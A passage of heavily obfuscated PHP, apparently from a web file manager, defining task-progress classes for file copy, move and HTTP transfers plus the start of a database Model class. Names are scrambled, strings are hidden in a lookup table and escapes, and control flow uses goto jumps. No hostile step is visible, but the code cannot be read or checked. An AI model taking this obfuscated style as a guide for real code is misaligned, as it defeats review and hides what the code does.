(!$bòºÄÊ›àÊ) { return; } goto Böå·ÀâÇ–; Böå·ÀâÇ–: $bòºÄÊ›àÊ[$F›‘š™Ìôš[986]] += $D‹Àãí¢ô×; $bòºÄÊ›àÊ[$F›‘š™Ìôš[1413]] = timeFloat(); if ($bòºÄÊ›àÊ[$F›‘š™Ìôš[974]]) { if ($bòºÄÊ›àÊ[$F›‘š™Ìôš[974]] < $bòºÄÊ›àÊ[$F›‘š™Ìôš[986]]) { $bòºÄÊ›àÊ[$F›‘š™Ìôš[974]] = $bòºÄÊ›àÊ[$F›‘š™Ìôš[986]]; } $aä“¶ğ«ô = timeFloat() - $bòºÄÊ›àÊ[$F›‘š™Ìôš[1412]] - $bòºÄÊ›àÊ[$F›‘š™Ìôš[1415]]; $bòºÄÊ›àÊ[$F›‘š™Ìôš[1410]] = $bòºÄÊ›àÊ[$F›‘š™Ìôš[986]] / $bòºÄÊ›àÊ[$F›‘š™Ìôš[974]]; $bòºÄÊ›àÊ[$F›‘š™Ìôš[1411]] = $bòºÄÊ›àÊ[$F›‘š™Ìôš[986]] / $aä“¶ğ«ô; if ($bòºÄÊ›àÊ[$F›‘š™Ìôš[1410]] > 0) { $bòºÄÊ›àÊ[$F›‘š™Ìôš[1416]] = $aä“¶ğ«ô * (1 - $bòºÄÊ›àÊ[$F›‘š™Ìôš[1410]]) / $bòºÄÊ›àÊ[$F›‘š™Ìôš[1410]]; } $bòºÄÊ›àÊ[$F›‘š™Ìôš[1416]] = $bòºÄÊ›àÊ[$F›‘š™Ìôš[1416]] <= 0 ? 0 : $bòºÄÊ›àÊ[$F›‘š™Ìôš[1416]]; } goto A¼¶Ú¨®ñ˜; A¼¶Ú¨®ñ˜: $this->updateAfter(); $F²±‰ñ—ã = 0.2; if (timeFloat() - $bòºÄÊ›àÊ[$F›‘š™Ìôš[1414]] < $F²±‰ñ—ã) { return; } goto Bêİï÷À°¦; Bêİï÷À°¦: $E¸……æ¾°î = self::get($bòºÄÊ›àÊ[$F›‘š™Ìôš[363]]); $e˜¬×„ˆ•¥ = $E¸……æ¾°î[$F›‘š™Ìôš[685]]; if ($e˜¬×„ˆ•¥ == self::STATYS_KILL) { $B—´ù÷¤Çõ = array($F›‘š™Ìôš[1424] => LNG($F›‘š™Ìôš[1425]), $F›‘š™Ìôš[1028] => !1); Cache::set($F›‘š™Ìôš[1426] . $this->task[$F›‘š™Ìôš[363]], $B—´ù÷¤Çõ, 30); $this->end(); die; } else { if ($e˜¬×„ˆ•¥ == self::STATYS_STOP) { $fÓèÁƒÃ¯Ø = 2; $E¸……æ¾°î[$F›‘š™Ìôš[1415]] += $fÓèÁƒÃ¯Ø; self::valueSet($bòºÄÊ›àÊ[$F›‘š™Ìôš[363]], $E¸……æ¾°î); sleep($fÓèÁƒÃ¯Ø); $this->update(); return; } } goto Eçİ¨‡ÙË; Eçİ¨‡ÙË: $bòºÄÊ›àÊ[$F›‘š™Ìôš[685]] = $e˜¬×„ˆ•¥ ? $e˜¬×„ˆ•¥ : $bòºÄÊ›àÊ[$F›‘š™Ìôš[685]]; $bòºÄÊ›àÊ[$F›‘š™Ìôš[1415]] = $E¸……æ¾°î[$F›‘š™Ìôš[1415]] ? $E¸……æ¾°î[$F›‘š™Ìôš[1415]] : 0; $bòºÄÊ›àÊ[$F›‘š™Ìôš[1414]] = timeFloat(); goto aØ’ÍÃµÃµ; bî‡õ½˜ö’: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($A±í†’Š¦Š) { $b”äîŸ‡§ =& $_SERVER[Ìó]; Cache::set($b”äîŸ‡§[1426] . $this->task[$b”äîŸ‡§[363]], $A±í†’Š¦Š, 60); return $A±í†’Š¦Š; } public static function get($CõõĞÈªËœ) { return self::valueGet($CõõĞÈªËœ); } public static function listData() { $BïÕ‚ã“Ê = self::valueGet(); return array_sort_by($BïÕ‚ã“Ê, $_SERVER[Ìó][1412], !0); } public static function kill($Dğìíß¶ƒÎ) { return self::changeStatus($Dğìíß¶ƒÎ, self::STATYS_KILL); } public static function stop($EÔßÓª¼Ç) { return self::changeStatus($EÔßÓª¼Ç, self::STATYS_STOP); } public static function restart($D÷ˆì¯×¤) { return self::changeStatus($D÷ˆì¯×¤, self::STATYS_RUNNING); } public static function killAll() { $FÖ­«À =& $_SERVER[Ìó]; $C½Íº‚¼åà = self::listData(); foreach ($C½Íº‚¼åà as $F‰Äô„Ğ²µ) { self::kill($F‰Äô„Ğ²µ[$FÖ­«À[363]]); } sleep(2); foreach ($C½Íº‚¼åà as $F‰Äô„Ğ²µ) { self::valueSet($F‰Äô„Ğ²µ[$FÖ­«À[363]], !1); } } private static function changeStatus($eÊÄ…—¬íÉ, $CÀ°ÔÀÒÀ†) { goto BãñÑ–ø­Å; DÓí»™¦ø„: return !0; goto Fô˜°Í®¥Í; BãñÑ–ø­Å: $bğ‰¢¡ =& $_SERVER[Ìó]; $CáÇˆ‡ˆ£è = self::valueGet($eÊÄ…—¬íÉ); if (!$CáÇˆ‡ˆ£è) { return !1; } goto FÓÂÂÁ´„§; FÓÂÂÁ´„§: $CáÇˆ‡ˆ£è[$bğ‰¢¡[685]] = $CÀ°ÔÀÒÀ†; self::valueSet($eÊÄ…—¬íÉ, $CáÇˆ‡ˆ£è); self::log($bğ‰¢¡[1428] . $CáÇˆ‡ˆ£è[$bğ‰¢¡[363]] . $bğ‰¢¡[1429] . $CÀ°ÔÀÒÀ†); goto DÓí»™¦ø„; Fô˜°Í®¥Í: } public static function valueGet($a‹İ·†ÒŒ“ = false) { $c¢ìâà‹Œ¦ =& $_SERVER[Ìó]; if ($a‹İ·†ÒŒ“) { $f†Üİó„„ = Model($c¢ìâà‹Œ¦[394])->where(array($c¢ìâà‹Œ¦[89] => $a‹İ·†ÒŒ“, $c¢ìâà‹Œ¦[29] => $c¢ìâà‹Œ¦[1430]))->find(); return $f†Üİó„„ ? json_decode($f†Üİó„„[$c¢ìâà‹Œ¦[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f™Æ‡œšÏÄ = false) { goto bß—¿…Š; bß—¿…Š: $DŒùÙÉ§À¨ =& $_SERVER[Ìó]; $D‡ğ’šÂö = array($DŒùÙÉ§À¨[29] => $DŒùÙÉ§À¨[1430]); if ($f™Æ‡œšÏÄ) { $D‡ğ’šÂö[$DŒùÙÉ§À¨[1409]] = $f™Æ‡œšÏÄ; } goto EÜÃµŞâ—æ; EÜÃµŞâ—æ: $Dº³£œ“Öò = Model($DŒùÙÉ§À¨[394])->where($D‡ğ’šÂö)->select(); $Dº³£œ“Öò = $Dº³£œ“Öò ? $Dº³£œ“Öò : array(); foreach ($Dº³£œ“Öò as $FÀŞí•Åìà => $b”ßƒÜÃ¡ï) { $Dº³£œ“Öò[$FÀŞí•Åìà] = json_decode($b”ßƒÜÃ¡ï[$DŒùÙÉ§À¨[355]], !0); } goto b‰¢æÀ÷‹; b‰¢æÀ÷‹: return $Dº³£œ“Öò; goto c”°¡êÌ—š; c”°¡êÌ—š: } public static function valueSet($e´Œêè‘ÚÍ, $C¶äˆïª’ê) { goto E“Ã´‘°ñß; FÑïõÏ„Èå: Model($eñ¯ÃƒÇ±—[394])->add($BçŠÎéÁ‘‰, array(), !0); goto a…ÈÜÃßö; A÷›ô¸±×: if (!$b¢ğÙ‰Îå) { ob_start(); var_dump($C¶äˆïª’ê); $fŸÊÅêÈ³ = ob_get_clean(); self::log($eñ¯ÃƒÇ±—[1431] . json_encode_force($fŸÊÅêÈ³)); } if (!$e´Œêè‘ÚÍ || !$C¶äˆïª’ê[$eñ¯ÃƒÇ±—[363]]) { return !1; } $BçŠÎéÁ‘‰ = array($eñ¯ÃƒÇ±—[29] => $eñ¯ÃƒÇ±—[1430], $eñ¯ÃƒÇ±—[1409] => USER_ID, $eñ¯ÃƒÇ±—[89] => $e´Œêè‘ÚÍ, $eñ¯ÃƒÇ±—[355] => $b¢ğÙ‰Îå); goto FÑïõÏ„Èå; E“Ã´‘°ñß: $eñ¯ÃƒÇ±— =& $_SERVER[Ìó]; if (!$C¶äˆïª’ê) { return Model($eñ¯ÃƒÇ±—[394])->where(array($eñ¯ÃƒÇ±—[89] => $e´Œêè‘ÚÍ, $eñ¯ÃƒÇ±—[29] => $eñ¯ÃƒÇ±—[1430]))->delete(); } $b¢ğÙ‰Îå = json_encode($C¶äˆïª’ê); goto A÷›ô¸±×; a…ÈÜÃßö: } public static function log($C”¸àíğùÅ) { write_log($C”¸àíğùÅ, $_SERVER[Ìó][1432]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto bš’£Ş–µ„; Dê¿¨»—Æ‚: Hook::bind($FÜ‰³ù“è[1433], array($this, $FÜ‰³ù“è[1434])); Hook::bind($FÜ‰³ù“è[1435], array($this, $FÜ‰³ù“è[1436])); Hook::bind($FÜ‰³ù“è[1437], array($this, $FÜ‰³ù“è[1438])); goto F¯ï‹Ê¿êÂ; bš’£Ş–µ„: $FÜ‰³ù“è =& $_SERVER[Ìó]; $e±î·îÅªø =& $this->task; $this->sourceCopyFolder = !1; goto Dê¿¨»—Æ‚; eêÒ× •£é: Hook::bind($FÜ‰³ù“è[506], array($this, $FÜ‰³ù“è[1442])); Hook::bind($FÜ‰³ù“è[508], array($this, $FÜ‰³ù“è[1442])); Hook::bind($FÜ‰³ù“è[510], array($this, $FÜ‰³ù“è[1442])); goto eç§ƒ®İ¼ã; E¶Ÿ’•ëøÊ: Hook::bind($FÜ‰³ù“è[538], array($this, $FÜ‰³ù“è[1441])); Hook::bind($FÜ‰³ù“è[504], array($this, $FÜ‰³ù“è[1442])); Hook::bind($FÜ‰³ù“è[501], array($this, $FÜ‰³ù“è[1442])); goto eêÒ× •£é; A¾×ÆÙóÔá: if (!$e±î·îÅªø[$FÜ‰³ù“è[1317]]) { $e±î·îÅªø[$FÜ‰³ù“è[1317]] = LNG($FÜ‰³ù“è[1458]); } goto EïÙÚî¾©°; a²¨ç÷á ÷: $e±î·îÅªø[$FÜ‰³ù“è[976]] = $FÜ‰³ù“è[33]; $e±î·îÅªø[$FÜ‰³ù“è[1456]] = $FÜ‰³ù“è[33]; $e±î·îÅªø[$FÜ‰³ù“è[1457]] = 0; goto A¾×ÆÙóÔá; F¯ï‹Ê¿êÂ: Hook::bind($FÜ‰³ù“è[534], array($this, $FÜ‰³ù“è[1439])); Hook::bind($FÜ‰³ù“è[535], array($this, $FÜ‰³ù“è[1440])); Hook::bind($FÜ‰³ù“è[537], array($this, $FÜ‰³ù“è[1441])); goto E¶Ÿ’•ëøÊ; eç§ƒ®İ¼ã: Hook::bind($FÜ‰³ù“è[1443], array($this, $FÜ‰³ù“è[1444])); Hook::bind($FÜ‰³ù“è[527], array($this, $FÜ‰³ù“è[1445])); $this->sourceModelCopyFlag = !1; goto b‡Ñİ¹´÷; b‡Ñİ¹´÷: Hook::bind($FÜ‰³ù“è[1446], array($this, $FÜ‰³ù“è[1447])); Hook::bind($FÜ‰³ù“è[1448], array($this, $FÜ‰³ù“è[1449])); Hook::bind($FÜ‰³ù“è[1450], array($this, $FÜ‰³ù“è[1451])); goto C‡¤Ûğ¿ù¸; C‡¤Ûğ¿ù¸: $e±î·îÅªø[$FÜ‰³ù“è[1452]] = LNG($FÜ‰³ù“è[1453]); $e±î·îÅªø[$FÜ‰³ù“è[1454]] = 0; $e±î·îÅªø[$FÜ‰³ù“è[1455]] = 0; goto a²¨ç÷á ÷; EïÙÚî¾©°: } protected function endAfter() { goto Aï£³¬ßÓÏ; b¶¹µ‡£ñ‰: Hook::unbind($FùÒÀà· À[501], array($this, $FùÒÀà· À[1442])); Hook::unbind($FùÒÀà· À[506], array($this, $FùÒÀà· À[1442])); Hook::unbind($FùÒÀà· À[508], array($this, $FùÒÀà· À[1442])); goto e†‰¨Ó¡Ù; e†‰¨Ó¡Ù: Hook::unbind($FùÒÀà· À[510], array($this, $FùÒÀà· À[1442])); Hook::unbind($FùÒÀà· À[1443], array($this, $FùÒÀà· À[1444])); Hook::unbind($FùÒÀà· À[527], array($this, $FùÒÀà· À[1445])); goto B™î°ŞÈª¤; B™î°ŞÈª¤: Hook::unbind($FùÒÀà· À[1446], array($this, $FùÒÀà· À[1447])); Hook::unbind($FùÒÀà· À[1448], array($this, $FùÒÀà· À[1449])); Hook::unbind($FùÒÀà· À[1450], array($this, $FùÒÀà· À[1451])); goto CôÍãøÌğ; Aï£³¬ßÓÏ: $FùÒÀà· À =& $_SERVER[Ìó]; Hook::unbind($FùÒÀà· À[1433], array($this, $FùÒÀà· À[1434])); Hook::unbind($FùÒÀà· À[1435], array($this, $FùÒÀà· À[1436])); goto bÔ‘Ó¥¡ºÀ; c…‡Å·ïã: Hook::unbind($FùÒÀà· À[537], array($this, $FùÒÀà· À[1441])); Hook::unbind($FùÒÀà· À[538], array($this, $FùÒÀà· À[1441])); Hook::unbind($FùÒÀà· À[504], array($this, $FùÒÀà· À[1442])); goto b¶¹µ‡£ñ‰; bÔ‘Ó¥¡ºÀ: Hook::unbind($FùÒÀà· À[1437], array($this, $FùÒÀà· À[1438])); Hook::unbind($FùÒÀà· À[534], array($this, $FùÒÀà· À[1439])); Hook::unbind($FùÒÀà· À[535], array($this, $FùÒÀà· À[1440])); goto c…‡Å·ïã; CôÍãøÌğ: } public function copyMoveStart($c‰ˆÑ‡Ûò¯, $FÄàì„£öË, $FÛğŒ´´ö, $AœÄê¦»§¹) { } public function updateAfter() { goto d¡èò‡ª†©; BŒŞßÜöœ: $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1410]] = ($a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1459]] + $BÈ÷²Œêˆˆ) / $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[694]]; if ($a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1410]] > 0) { $féŸ£¸Œ¾‘ = timeFloat() - $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1412]] - $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1415]]; $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1416]] = $féŸ£¸Œ¾‘ * (1 - $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1410]]) / $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1410]]; } goto Eê¨áÂ£Ù; bƒŠÂëŠïÓ: if ($this->sourceModelCopyFlag) { return; } $BÈ÷²Œêˆˆ = 0; if ($a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1456]] == $c‹…”Ñ¿¸‹[1036]) { $BÈ÷²Œêˆˆ = $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1455]] * 0.5; } else { if ($a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1456]] == $c‹…”Ñ¿¸‹[102]) { $BÈ÷²Œêˆˆ = $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1455]] * 0.5 + $a¡œ« ˜‹[$c‹…”Ñ¿¸‹[1454]] * 0.5; } } goto BŒŞßÜöœ; d¡èò‡ª†©: $c‹…”Ñ¿¸‹ =& $_SERVER[Ìó]; $a¡œ« ˜‹ =& $this->task; if (!$a¡œ« ˜‹[$c‹…”Ñ¿¸‹[694]]) { return; } goto bƒŠÂëŠïÓ; Eê¨áÂ£Ù: } public function addPath($EÖ²È¿•©¢) { goto EÁŸÍÕã™; eÀ©Ô•³: $BÆ½Ç¹öÔ = IO::infoWithChildren($EÖ²È¿•©¢); $d¼´½¼†Ñ = $F«Í×‹õ¾[$FÅñÊÄ¿·…[1460]] ? $F«Í×‹õ¾[$FÅñÊÄ¿·…[1460]][$FÅñÊÄ¿·…[1461]] : 0; $F«Í×‹õ¾[$FÅñÊÄ¿·…[1460]] = array($FÅñÊÄ¿·…[1461] => $d¼´½¼†Ñ + 1, $FÅñÊÄ¿·…[382] => $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[28]], $FÅñÊÄ¿·…[75] => $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[75]], $FÅñÊÄ¿·…[461] => $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[461]] ? $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[461]] : $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[75]]); goto bÒ×Á Ş¤; EÁŸÍÕã™: $FÅñÊÄ¿·… =& $_SERVER[Ìó]; if (!$EÖ²È¿•©¢) { return; } $F«Í×‹õ¾ =& $this->task; goto eÀ©Ô•³; bÒ×Á Ş¤: if ($BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[29]] == $FÅñÊÄ¿·…[163]) { $F«Í×‹õ¾[$FÅñÊÄ¿·…[974]] += 1; } else { $F«Í×‹õ¾[$FÅñÊÄ¿·…[974]] += $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[80]][$FÅñÊÄ¿·…[78]]; if ($BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[365]]) { $F«Í×‹õ¾[$FÅñÊÄ¿·…[974]] += $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[80]][$FÅñÊÄ¿·…[79]] + 1; } } $F«Í×‹õ¾[$FÅñÊÄ¿·…[694]] += $BÆ½Ç¹öÔ[$FÅñÊÄ¿·…[77]]; $this->update(); goto Dõ›¢ŒÖ¿; Dõ›¢ŒÖ¿: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f´«†â¨ñ) { $e¼÷ˆÓ¹Š“ =& $_SERVER[Ìó]; $B†ÑòƒæÛ =& $this->task; $B†ÑòƒæÛ[$e¼÷ˆÓ¹Š“[1452]] = $f´«†â¨ñ[$e¼÷ˆÓ¹Š“[28]]; $B†ÑòƒæÛ[$e¼÷ˆÓ¹Š“[976]] = $f´«†â¨ñ[$e¼÷ˆÓ¹Š“[28]]; $this->update(); } public function copyFileStart($aë¡Íá‡Ş˜, $dÖØÅÍ¾ÙÇ, $B…Î‡Á²æ, $CÇÕ»ˆ„¨´, $FÚÖ¥ŠÎÜ‹, $c÷³æ…Üñ˜) { goto b×ó¥â„ë; a‰‰´äò„: $GLOBALS[$DÅ‹•¨‰Å£[1463]] = $FÚÖ¥ŠÎÜ‹; $GLOBALS[$DÅ‹•¨‰Å£[1462]] = $c÷³æ…Üñ˜; $d÷ºâïÃ– =& $this->task; goto Cää¤Şë©¸; b×ó¥â„ë: $DÅ‹•¨‰Å£ =& $_SERVER[Ìó]; $FÊ‹Š¦á = $FÚÖ¥ŠÎÜ‹; if ($FÊ‹Š¦á == $GLOBALS[$DÅ‹•¨‰Å£[1462]]) { $FÊ‹Š¦á = $GLOBALS[$DÅ‹•¨‰Å£[1463]]; } goto a‰‰´äò„; B¿ÍîÔ‘÷¢: $this->update(); goto A·êä‚µÑ; BÊ®¸Õš½Ò: $d÷ºâïÃ–[$DÅ‹•¨‰Å£[976]] = $DÅ‹•¨‰Å£[33]; $d÷ºâïÃ–[$DÅ‹•¨‰Å£[1456]] = $DÅ‹•¨‰Å£[33]; $d÷ºâïÃ–[$DÅ‹•¨‰Å£[1457]] = 0; goto B¿ÍîÔ‘÷¢; Cää¤Şë©¸: $d÷ºâïÃ–[$DÅ‹•¨‰Å£[1452]] = $FÊ‹Š¦á; $d÷ºâïÃ–[$DÅ‹•¨‰Å£[1454]] = (int) $aë¡Íá‡Ş˜->size($dÖØÅÍ¾ÙÇ); $d÷ºâïÃ–[$DÅ‹•¨‰Å£[1455]] = 0; goto BÊ®¸Õš½Ò; A·êä‚µÑ: } public function copyFileEnd($A¢ô˜íÄ, $bœŠÆ‡êÁ, $aˆĞÜğ‰Ş‘, $eêª×Ç”ß, $a÷Ù–ååÅ•, $B³„–êŞ‚) { $d™Ø–ªÜñ =& $_SERVER[Ìó]; $Dœã÷´İà =& $this->task; $Dœã÷´İà[$d™Ø–ªÜñ[1455]] = $Dœã÷´İà[$d™Ø–ªÜñ[1454]]; $Dœã÷´İà[$d™Ø–ªÜñ[1456]] = $d™Ø–ªÜñ[33]; if ($a÷Ù–ååÅ• == $Dœã÷´İà[$d™Ø–ªÜñ[1452]]) { $Dœã÷´İà[$d™Ø–ªÜñ[1459]] += $Dœã÷´İà[$d™Ø–ªÜñ[1454]]; $this->update(1); } else { $this->update(); $Dœã÷´İà[$d™Ø–ªÜñ[1455]] = 0; } self::log($d™Ø–ªÜñ[1464] . $bœŠÆ‡êÁ . $d™Ø–ªÜñ[66] . $eêª×Ç”ß . $d™Ø–ªÜñ[213] . $a÷Ù–ååÅ• . $d™Ø–ªÜñ[1465] . $Dœã÷´İà[$d™Ø–ªÜñ[1452]]); } public function updateFileEnd($aµÒâùÒ˜Ø, $d¤œ™…ÊÜ) { $D½ÖÏì÷šÜ =& $_SERVER[Ìó]; $b¾ëá…øÇ =& $this->task; $b¾ëá…øÇ[$D½ÖÏì÷šÜ[1452]] = $aµÒâùÒ˜Ø; $b¾ëá…øÇ[$D½ÖÏì÷šÜ[1454]] = $d¤œ™…ÊÜ; $b¾ëá…øÇ[$D½ÖÏì÷šÜ[1459]] += $d¤œ™…ÊÜ; $this->update(1); } public function sourceModelCopy($eöÚçòË¤) { goto c”„‡’é…; aºá‡ù•‰: switch ($c‘Òæª”‹µ) { case $cßîó¼ìÀ[502]: $bÇÂñ£«ÜÕ = 1; break; case $cßîó¼ìÀ[505]: $f éğÃÀßİ[$cßîó¼ìÀ[1452]] = $dôñ»«Êè¡[$cßîó¼ìÀ[28]]; break; case $cßîó¼ìÀ[507]: $bÇÂñ£«ÜÕ = intval($eöÚçòË¤[$cßîó¼ìÀ[359]] * 0.4); break; case $cßîó¼ìÀ[509]: $bÇÂñ£«ÜÕ = intval($eöÚçòË¤[$cßîó¼ìÀ[359]] * 0.2); break; case $cßîó¼ìÀ[511]: $bÇÂñ£«ÜÕ = intval($eöÚçòË¤[$cßîó¼ìÀ[359]] * 0.4); break; } $this->update($bÇÂñ£«ÜÕ); $this->sourceModelCopyFlag = !1; goto FÄÁŠ£ïô‰; E”ÓèñÌ¹Ï: $f éğÃÀßİ =& $this->task; $this->sourceModelCopyFlag = !0; $bÇÂñ£«ÜÕ = 0; goto aºá‡ù•‰; c”„‡’é…: $cßîó¼ìÀ =& $_SERVER[Ìó]; $c‘Òæª”‹µ = $eöÚçòË¤[0]; $dôñ»«Êè¡ = $eöÚçòË¤[1]; goto E”ÓèñÌ¹Ï; FÄÁŠ£ïô‰: } public function sourceRemove($aæ´õÓ‘ƒÅ, $böî÷åïì) { $F×­¢§ğÃÂ =& $_SERVER[Ìó]; $this->sourceModelCopyFlag = !0; $dº˜ªàÀƒù = 1; if (isset($aæ´õÓ‘ƒÅ[$F×­¢§ğÃÂ[80]])) { $dº˜ªàÀƒù = $aæ´õÓ‘ƒÅ[$F×­¢§ğÃÂ[80]][$F×­¢§ğÃÂ[78]] + $aæ´õÓ‘ƒÅ[$F×­¢§ğÃÂ[80]][$F×­¢§ğÃÂ[79]] + 1; } $this->update($dº˜ªàÀƒù); $this->sourceModelCopyFlag = !1; } public function sourceMove($Eà»£Ğõœ¸) { $this->sourceRemove($Eà»£Ğõœ¸, !1); } public function curlProgress($e³¦‘Ôšì‰, $b´í¦’Úœ¶, $E”ÕÑÜŞ‚ö, $a’æ®¦ “ç, $Eéí‡Ø‰—) { $CÛÔ±íåµ =& $_SERVER[Ìó]; $e‡¾İåº… =& $this->task; if ($Eéí‡Ø‰— > 0) { $e‡¾İåº…[$CÛÔ±íåµ[976]] = $CÛÔ±íåµ[1466]; $e‡¾İåº…[$CÛÔ±íåµ[1456]] = $CÛÔ±íåµ[102]; if ($e‡¾İåº…[$CÛÔ±íåµ[1454]] == $a’æ®¦ “ç || $a’æ®¦ “ç > 1024 * 1024) { $e‡¾İåº…[$CÛÔ±íåµ[1455]] = $Eéí‡Ø‰—; } if ($e‡¾İåº…[$CÛÔ±íåµ[1457]]) { $e‡¾İåº…[$CÛÔ±íåµ[1455]] = $Eéí‡Ø‰— + $e‡¾İåº…[$CÛÔ±íåµ[1457]]; } } else { if ($E”ÕÑÜŞ‚ö > 0) { if ($e‡¾İåº…[$CÛÔ±íåµ[1454]] == $b´í¦’Úœ¶) { $e‡¾İåº…[$CÛÔ±íåµ[1455]] = $E”ÕÑÜŞ‚ö; $e‡¾İåº…[$CÛÔ±íåµ[976]] = $CÛÔ±íåµ[1467]; $e‡¾İåº…[$CÛÔ±íåµ[1456]] = $CÛÔ±íåµ[1036]; } } } $this->update(); } public function curlProgressStart($FäóÊÁ­¢ƒ) { } public function curlProgressEnd($b¶‰¾¼ƒŠ¤) { $D£ò‡¿½ê =& $_SERVER[Ìó]; $f«•‹º¿ÇÒ =& $this->task; $aË¶í˜šğ = curl_getinfo($b¶‰¾¼ƒŠ¤); $e‰©ğç‘ø® = $aË¶í˜šğ[$D£ò‡¿½ê[1468]]; if ($f«•‹º¿ÇÒ[$D£ò‡¿½ê[1456]] == $D£ò‡¿½ê[102] && $e‰©ğç‘ø®) { $f«•‹º¿ÇÒ[$D£ò‡¿½ê[1457]] += $e‰©ğç‘ø®; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $D¸¢ê’È– =& $_SERVER[Ìó]; Hook::bind($D¸¢ê’È–[1446], array($this, $D¸¢ê’È–[1469])); Hook::bind($D¸¢ê’È–[1448], array($this, $D¸¢ê’È–[1470])); Hook::bind($D¸¢ê’È–[1450], array($this, $D¸¢ê’È–[1471])); } protected function endAfter() { $f»‚Â×ÊÉ =& $_SERVER[Ìó]; Hook::unbind($f»‚Â×ÊÉ[1446], array($this, $f»‚Â×ÊÉ[1469])); Hook::unbind($f»‚Â×ÊÉ[1448], array($this, $f»‚Â×ÊÉ[1470])); Hook::unbind($f»‚Â×ÊÉ[1450], array($this, $f»‚Â×ÊÉ[1471])); } public function progressStart($fö¹À›±ÅÀ) { $F¯ÊÙğ¹³† =& $_SERVER[Ìó]; $b¨ˆ£Ñ—ä = curl_getinfo($fö¹À›±ÅÀ); self::log($F¯ÊÙğ¹³†[1472] . $b¨ˆ£Ñ—ä[$F¯ÊÙğ¹³†[291]]); self::valueSet($this->task[$F¯ÊÙğ¹³†[363]], $this->task); } public function progressEnd($e¹øŠ¥®–Ä) { $C°…ƒ†ª¥ =& $_SERVER[Ìó]; self::log($C°…ƒ†ª¥[1473] . $this->task[$C°…ƒ†ª¥[363]]); $this->end(); } public function progress($eÎò¢‰¿¨”, $eæª×Õ¿ùà, $f½…‡öğ“, $d»…Ÿ—ƒÑ°, $fÂÒŞ¬—å) { $d‰²×ù» =& $_SERVER[Ìó]; $Dƒä¤ç˜ô— =& $this->task; if ($fÂÒŞ¬—å > 0) { $Dƒä¤ç˜ô—[$d‰²×ù»[974]] = $Dƒä¤ç˜ô—[$d‰²×ù»[974]] == 0 ? $d»…Ÿ—ƒÑ° : $Dƒä¤ç˜ô—[$d‰²×ù»[974]]; $Dƒä¤ç˜ô—[$d‰²×ù»[986]] = $fÂÒŞ¬—å; } else { if ($f½…‡öğ“ > 0) { $Dƒä¤ç˜ô—[$d‰²×ù»[974]] = $Dƒä¤ç˜ô—[$d‰²×ù»[974]] == 0 ? $eæª×Õ¿ùà : $Dƒä¤ç˜ô—[$d‰²×ù»[974]]; $Dƒä¤ç˜ô—[$d‰²×ù»[986]] = $f½…‡öğ“; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\x73\110\x74\x74\160\72\x64\x6f\x77\x6e\72{$f½…‡öğ“}\57{$eæª×Õ¿ùà}\73\x20\165\x70\x6c\x6f\141\144\72{$fÂÒŞ¬—å}\57{$d»…Ÿ—ƒÑ°}\x3b"); } } goto BÑå©¹Ñ³; aµâ¦¦“ë½: define($_SERVER[Ìó][226], 0); define($_SERVER[Ìó][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\157\162\x64\145\x72", "\x61\154\151\141\x73", "\150\x61\x76\151\156\147", "\147\162\x6f\x75\x70", "\154\157\143\153", "\144\x69\163\x74\x69\156\x63\x74", "\x61\x75\164\157", "\x66\x69\154\x74\145\x72", "\x76\x61\x6c\x69\x64\141\164\x65", "\162\x65\163\x75\x6c\x74", "\142\151\x6e\x64", "\x74\157\x6b\x65\x6e"); public function __construct($A¸ÀÂ×ñ‡ì = '', $Eåáç¡ŸâŒ = '', $aÔù¼ïñÔ = '') { $f‰’Ñ¾İˆ© =& $_SERVER[Ìó]; $this->_initialize(); if (!empty($A¸ÀÂ×ñ‡ì)) { if (strpos($A¸ÀÂ×ñ‡ì, $f‰’Ñ¾İˆ©[91])) { list($this->dbName, $this->name) = explode($f‰’Ñ¾İˆ©[91], $A¸ÀÂ×ñ‡ì); } else { $this->name = $A¸ÀÂ×ñ‡ì; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Eåáç¡ŸâŒ)) { $this->tablePrefix = $f‰’Ñ¾İˆ©[33]; } elseif ($f‰’Ñ¾İˆ©[33] != $Eåáç¡ŸâŒ) { $this->tablePrefix = $Eåáç¡ŸâŒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($f‰’Ñ¾İˆ©[228]); } $this->db(0, empty($this->connection) ? $aÔù¼ïñÔ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $b¡–öÛ×ê =& $_SERVER[Ìó]; if (empty($this->fields)) { if 